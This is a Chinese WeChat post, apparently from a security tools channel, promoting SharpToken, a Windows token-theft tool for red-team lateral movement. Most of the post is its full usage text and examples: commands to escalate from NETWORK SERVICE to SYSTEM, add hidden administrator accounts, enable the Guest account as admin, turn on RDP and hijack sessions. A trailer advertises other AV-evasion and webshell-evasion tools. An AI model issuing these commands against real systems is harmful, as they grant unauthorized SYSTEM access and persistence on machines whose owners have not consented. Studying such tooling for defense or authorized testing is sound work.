<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/k176QzHEC6CpFsN2rVwg1A)

<table><tbody><tr><td width="557" valign="top" height="62"><p><strong>声明：</strong>该公众号分享的安全工具和项目均来源于网络，仅供安全研究与学习之用，如用于其他用途，由使用者承担全部法律及连带责任，与工具作者和本公众号无关。</p></td></tr></tbody></table>

**工具介绍**

在红队横向移动的过程中，我们经常需要窃取其他用户的权限。在现代 EDR 的防御下，我们很难使用 Mimikatz 获取其他用户的权限，如果目标用户没有活着的进程，我们也没有办法使用 “OpenProcessToken” 来窃取 Token。  

SharpToken 是一种利用令牌泄漏的工具，它可以从系统中的所有进程中找到泄漏的令牌并使用它们，如果你是低权限服务用户，你甚至可以用它升级到 “NT AUTHORITY\SYSTEM” 权限，无需目标用户的密码就可以切换到目标用户的桌面做更多的事情。

**工具用法**

```
SharpToken By BeichenDream
=========================================================
Github : https://github.com/BeichenDream/SharpToken
If you are an NT AUTHORITY\NETWORK SERVICE user then you just need to add the bypass parameter to become an NT AUTHORIT\YSYSTEM
e.g.
SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami" bypass
Usage:
SharpToken COMMAND arguments
COMMANDS:
        list_token [process pid]        [bypass]
        list_all_token [process pid] [bypass]
        add_user    <username> <password> [group] [domain] [bypass]
        enableUser <username> <NewPassword> [NewGroup] [bypass]
        delete_user <username> [domain] [bypass]
        execute <tokenUser> <commandLine> [Interactive] [bypass]
        enableRDP [bypass]
        tscon <targetSessionId> [sourceSessionId] [bypass]
example:
    SharpToken list_token
    SharpToken list_token bypass
    SharpToken list_token 6543
    SharpToken add_user admin Abcd1234! Administrators
    SharpToken enableUser Guest Abcd1234! Administrators
    SharpToken delete_user admin
    SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami"
    SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami" bypass
    SharpToken execute "NT AUTHORITY\SYSTEM" cmd true
    SharpToken execute "NT AUTHORITY\SYSTEM" cmd true bypass
    SharpToken tscon 1

```

![](https://mmbiz.qpic.cn/mmbiz_png/79gZQNibQ6udfcFjY9HjiaiczRIcdkIxe6wgBgsnmFXW0rjibicyhBPKrjFINDibSCJoibPPqITawJoyWkUsrlUia0HcRA/640?wx_fmt=png)

**提升权限**

除了通常的 Token 窃取权限增强，SharpToken 还支持通过 Bypass 获取完整的 Token。  

如果你是 NT AUTHORITY/NETWORK SERVICE 用户，你添加了 bypass 参数，SharpToken 会从 RPCSS 窃取 System，即无条件的 NT AUTHORITY\NETWORK SERVICE 到 NT AUTHORITY\SYSTEM

![](https://mmbiz.qpic.cn/mmbiz_png/79gZQNibQ6udfcFjY9HjiaiczRIcdkIxe6wBJHJpaRK15ytQuVQS4aMocOatGsbwDdR07eibc1WbHBibq54dMXvLNwQ/640?wx_fmt=png)

**ListToken**

枚举信息包括 SID、LogonDomain、UserName、Session、LogonType、TokenType、TokenHandle（Duplicate 后 Token 的句柄）、TargetProcessId（Token 产生的进程）、TargetProcessToken（源进程中 Token 的句柄）、Groups（Token 用户所在的组）位于）  

```
SharpToken list_token

```

![](https://mmbiz.qpic.cn/mmbiz_png/79gZQNibQ6udfcFjY9HjiaiczRIcdkIxe6wDot9jWbRyQCdXZ5xbafsNYW169vOQL34sMFxUrs43xTz69BicWBRWag/640?wx_fmt=png)

**枚举来自指定进程的令牌**

```
SharpToken list_token 468

```

![](https://mmbiz.qpic.cn/mmbiz_png/79gZQNibQ6udfcFjY9HjiaiczRIcdkIxe6wbGqn3ic3OLpfXYNmiazxXx1am8RvOCXgYSrgL9zpGw7O2cKjEc7xMlWg/640?wx_fmt=png)

**获取交互式 shell**

```
execute "NT AUTHORITY\SYSTEM" cmd true

```

![](https://mmbiz.qpic.cn/mmbiz_png/79gZQNibQ6udfcFjY9HjiaiczRIcdkIxe6wwhBTIeg293wYpEDIQjRwm3Nwox0QIy6aAbXPNT0JDrLU9yGFJquUyQ/640?wx_fmt=png)

**获取命令执行结果（在 webshell 下执行）**

```
SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami"

```

![](https://mmbiz.qpic.cn/mmbiz_png/79gZQNibQ6udfcFjY9HjiaiczRIcdkIxe6wAsIia48LsUsTRjZh4MsoChYibyicTcCETgLh6icoZA43Op76MTwDY3yptw/640?wx_fmt=png)

......  

**下载地址**

**点击下方名片进入公众号**

**回复关键字【****23****0506****】获取******下载链接****

关注公众号回复 “1208” 可以领取个人常用高效爆破字典，“0221”2020 年酒仙桥文章打包，“1212” 杀软对比源码 + 数据源，“0421”Windows 提权工具包。

往期推荐工具

[渗透测试常用的数据库综合利用工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247484579&idx=1&sn=2f2054508220223100066edf3064b37b&chksm=9036e21ba7416b0d7afecc97d3338d954023a51a5622939782273f264207363e4ea8ba9d18de&scene=21#wechat_redirect)

[RequestTemplate 红队内网渗透工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247484512&idx=1&sn=90d24f2727ba99c870d7112c406bf208&chksm=9036e2d8a7416bce7e190896de3c7cbd428d385d5563717bce46b0c7f51f33ea18d3e0f1af1e&scene=21#wechat_redirect)

[Railgun - 一款 GUI 界面的渗透工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247484499&idx=1&sn=edeae57e8306db1bfdcb72e0b0b655d2&chksm=9036e2eba7416bfdbe6a495b60a89d1a677fc745aa512036072224fc1537d8931276e55f7c90&scene=21#wechat_redirect)

[GoBypass - Golang 免杀生成工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247484019&idx=1&sn=05133dd5cb31474078eb4ab019f164f3&chksm=9036e4cba7416ddd92c8f9147bb2d283ddedcdfb4d46ed5987d192863008be9bc655025e0697&scene=21#wechat_redirect)

[ByPassBehinder 冰蝎 WebShell 免杀工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247484096&idx=1&sn=487a1f9daf0090071913aeceeb266d53&chksm=9036e478a7416d6ebced132fe4a03bb1d2584d7fb3eb433612151648743322ff900ae849d572&scene=21#wechat_redirect)

[SweetBabyScan 内网资产探测漏扫工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247484070&idx=1&sn=eb4cd4f6aac6e0a0ef26a75e4bc2bc7a&chksm=9036e41ea7416d088f70e8593099f750c81b079de1b4b14219276b352a2e83a3eb1d5829c94b&scene=21#wechat_redirect)

[掩日 - 适用于红队的综合免杀工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247483997&idx=1&sn=1a87fc6bfec2a48dd3dfa5bc2852e8e8&chksm=9036e4e5a7416df3ff7f5b4cf55b4c8c57cde271128de0b9fcdf381a19afb207223deb88fb61&scene=21#wechat_redirect)

[AuxTools 浮鱼渗透辅助工具箱 V1](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247483907&idx=1&sn=4e7cf5de0472f6685edb64a598e6aff8&chksm=9036e4bba7416dad5aa253462a84d0c47fdb4e89914c70bd5a3fbbd8b4ef05572a4e7e702faa&scene=21#wechat_redirect).0

[POCbomber 红队快速打点漏洞检测工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247483790&idx=1&sn=35e3a0fa64cff8d72313fa41ddcbfc3c&chksm=9036e736a7416e20dcd23cfede5c887bfecf5e489234eeb67040bcbbc6326cb42373d226a186&scene=21#wechat_redirect)